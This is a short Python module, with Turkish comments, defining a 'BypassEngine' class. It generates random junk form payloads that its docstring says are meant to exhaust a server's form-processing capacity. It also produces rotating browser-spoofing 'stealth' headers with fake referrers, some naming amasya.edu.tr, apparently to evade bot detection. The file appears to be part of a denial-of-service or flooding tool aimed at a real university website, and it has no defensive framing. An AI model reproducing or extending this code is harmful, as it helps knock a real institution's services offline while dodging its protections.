import random
import time
import string

class BypassEngine:
    def __init__(self):
        # Gerçekçi referrer listesi - Sitenin kendi içinden geliyormuşuz gibi
        self.referrers = [
            "https://www.google.com/search?q=amasya+üniversitesi",
            "https://www.bing.com/",
            "https://yandex.com.tr/",
            "https://www.amasya.edu.tr/akademik",
            "https://www.amasya.edu.tr/ogrenci"
        ]

    def get_dynamic_payload(self):
        """Sunucunun form işleme kapasitesini yoran anlamsız veriler."""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(500, 2000)))

    def get_stealth_headers(self):
        ver = random.randint(120, 125)
        # JA3 ve modern tarayıcı taklidi için her vuruşta değişen header'lar
        headers = {
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Referer": random.choice(self.referrers),
            "Sec-Ch-Ua": f'"Chromium";v="{ver}", "Google Chrome";v="{ver}", "Not=A?Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "Connection": "keep-alive"
        }
        return headers